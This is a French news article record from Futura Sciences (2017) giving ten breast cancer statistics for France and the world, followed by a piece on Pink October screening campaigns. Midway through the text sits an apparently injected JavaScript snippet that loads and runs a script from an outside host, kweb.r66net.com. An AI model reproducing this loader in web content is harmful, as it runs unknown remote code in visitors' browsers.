{"title": "Octobre rose : le cancer du sein en 10 chiffres", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-10-17", "content": "Au mois d'octobre, les initiatives se multiplient pour parler du cancer du sein et de son depistage. Mais combien de femmes sont touchees par cette maladie en France et dans le monde ? Voici dix chiffres pour mieux connaitre cette pathologie trop frequente. Ce qu'il faut retenir En France, 54.000 personnes recoivent un diagnostic du cancer du sein chaque annee. L'age moyen au diagnostic est de 61 ans. Le depistage par mammographie est propose a toutes les femmes de 50 a 74 ans tous les deux ans. Le  cancer du sein  est le cancer qui touche le plus les femmes, causant des milliers de deces en France et dans le monde. Des ameliorations ont ete notees ces dernieres annees quant a la survie des patientes. 54.000 nouveaux cas de cancers du sein par an C'est le nombre de nouveaux cas de cancers du sein detectes par an en France, d'apres l' agence Sante publique France . Le cancer du sein est le cancer le plus frequent chez la femme et le deuxieme cancer apres celui de la prostate. L'incidence du cancer du sein a beaucoup augmente entre 1980 et 2000, avec une progression de 2,7 % par an en moyenne, puis a diminue entre 2005 et 2012, perdant 1,5 % par an.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  1,7 million de nouveaux cas de cancers du sein par an Dans le monde, environ 1,7 million de nouveaux cas ont ete detectes en 2012. Les taux d'incidence sont plus eleves dans les pays developpes : ainsi, l'incidence est de 27 cas pour 100.000 personnes en Afrique centrale, contre 92 cas pour 100.000 en Amerique du nord, d'apres les chiffres de l' IARC . Le saviez-vous ? Un cancer du sein est du a la multiplication de certaines cellules qui forment une masse ou tumeur. Tous les cancers du sein n'evoluent pas de la meme facon, certains sont agressifs et d'autres evoluent plus lentement. Les cellules cancereuses peuvent rester dans le sein ou se propager a d'autres organes. Les traitements utilisent la chirurgie, la radiotherapie, l'hormonotherapie, la chimiotherapie et les therapies ciblees. 12.000 deces par an en France En 2015, environ 12.000 personnes sont decedees d'un cancer du sein en France. Le cancer du sein est le cancer qui cause le plus de deces chez les femmes francaises. C'est aussi la troisieme cause de mortalite par cancer. 522.000 deces par an dans le monde C'est le nombre de deces annuel par cancer du sein dans le monde. La mortalite est plus elevee dans les pays pauvres. En France, la mortalite est de 14,6 pour 100.000 femmes ; ce taux de mortalite a baisse de 1995 a 2012, avec une diminution de 1,4 % par an en moyenne. En Afrique de l'ouest la mortalite est de 20 pour 100.000 personnes. 87 % C'est le taux de survie a cinq ans des femmes diagnostiquees avec un cancer du sein en France entre 2005 et 2010. Le taux de survie a dix ans s'etablit a 78 % pour les femmes diagnostiquees entre 1999 et 2004. La survie s'est amelioree grace aux progres du diagnostic et des therapies. 650.000 femmes en France En France, 650.000 femmes sont atteintes d'un cancer du sein ou ont ete touchees par cette maladie. 220.000 femmes ont eu un cancer du sein au cours des cinq dernieres annees. 50 ans C'est l'age auquel commence le  depistage  organise par  mammographie . Il est propose a toutes les femmes jusqu'a 74 ans, avec une mammographie tous les deux ans. La mammographie est proposee systematiquement a toutes les femmes francaises entre 50 a 74 ans. (c) Monkey Business, Fotolia                               1994 C'est la date a laquelle la Direction generale de la sante (DGS) a mis en place le programme de depistage organise du cancer du sein en France. Ce programme a ete generalise a tout le territoire francais en 2004. 61 ans L'age auquel est etabli le diagnostic du cancer du sein est en moyenne de 61 ans, d'apres la  Haute autorite de sante  (HAS). 1 % C'est le pourcentage de cancers du sein qui touchent des hommes, d'apres la  ligue contre le cancer . Pour en savoir plus Cancer du sein : une mobilisation rose en octobre Article de Destination Sante paru le 1er octobre 2010 Pour encourager les femmes a se faire depister, ce mois d'octobre 2010 sera rose. Des expositions, des marches, une campagne d'informations... Tous les moyens sont bons pour faire reculer le cancer du sein. Etat des lieux non exhaustif. Tout au long de ce mois d'octobre, la baguette de pain se  mue  en messager d'Octobre rose. Pour encourager les femmes a participer au  depistage  organise, les  Comites feminins pour la prevention et le depistage des cancers du sein  ont eu cette drole d'idee : afficher des messages de sensibilisation sur... 25 millions de sachets pour baguettes de pain, distribues par 14.000 boulangers dans 48 departements. Les messages sont les suivants : <<  Le depistage organise ? C'est une mammographie avec double lecture car deux avis valent mieux qu'un !  >>  <<  Depistage organise du cancer du sein : des 50 ans, c'est tous les 2 ans  >>. Les Comites organisent egalement des initiations a la marche nordique dans  15 villes francaises . Elles demarrent ce 1 er  octobre a Bordeaux et se termineront a St Pons de Thomieres (Herault) le 24. Le principe est le meme que pour les marches pour lutter contre la  BPCO  (broncho-pneumopathie chronique obstructive) puisque les marches sont encadrees par des <<  coachs athle-sante  >> de la Federation francaise d'athletisme. Tout savoir sur :  www.marchenordiquedescomitesfeminins.com/ Si vous avez l'occasion de vous rendre a Bordeaux, ne ratez pas l'expo photos  Aux seins de la Vie . A travers des cliches <<  doux et pudiques  >>, la photographe Nathalie Kaid raconte le parcours de quarante femmes. Des images sur lesquelles l'auteur Marie-Laure Hubert Nasser a ajoute ses mots. <<  Parfois ronds et craquants, parfois glaces et claquants, parfois tendres ou violents...  >> A voir sur les  murs  de l'Institut Bergonie - le Centre regional de lutte contre le cancer de Bordeaux et du sud-ouest - du 1 er  au 31 octobre. Ainsi qu'en differents points de la ville : sur les quais, le long du  Miroir  d'Eau et Cours Mably. Meme une carte bancaire ornee du ruban rose ! Dans un autre domaine, l' Association pour la recherche sur le cancer  (ARC) a choisi de s'associer a la Bred Banque Populaire et de proposer une carte bancaire ornee du ruban rose. Pour chaque souscription, la banque reverse 6 euros nets a l'ARC. Comme La  Ligue contre le cancer , l'ARC soutient egalement le Ruban de l'espoir, une caravane itinerante qui va s'arreter dans 10 villes francaises. Depart de Paris ce 30 septembre, arrivee le 12 octobre a Strasbourg. A chaque etape, des conferences, des expositions, des ateliers sont organises pour sensibiliser au depistage. Pour tout savoir rendez-vous sur le  site d'Amoena , le fabricant de  protheses  mammaires et de lingerie a l'origine de cette initiative. De son cote, l' Institut national du cancer  (Inca) a choisi de mobiliser les femmes  refractaires  au depistage organise mais aussi... leurs filles. <<  Mobilisez les femmes que vous aimez  >> leur lance l'Institut. <<  Il s'agit, par le biais de ces deux leviers, de contribuer a l'augmentation du depistage organise du  cancer du sein  et a la lutte contre les inegalites d'acces et de recours au depistage  >>. Lequel, rappelons-le s'elevait a seulement 53 % en 2009. Affichage urbain, TV,  radio ,  Web ... La campagne d'information prevoit notamment la possibilite d'envoyer a sa mere ou a l'une de ses proches un message par sms ou e-mail pour les inviter a participer au depistage organise. Les  reseaux sociaux  seront egalement utilises pour amplifier la mobilisation. Quels sont les differents traitements efficaces contre le cancer du sein ?                       Le cancer du sein est le cancer le plus frequent chez la femme. En 2012, environ 48.000 personnes ont developpe ce cancer et pres de 9 personnes sur 10 en ont gueri. Les Hopitaux Universitaires de Geneve nous expliquent au cours de ce film comment se deroule le traitement.                                       ", "theme": "sante"}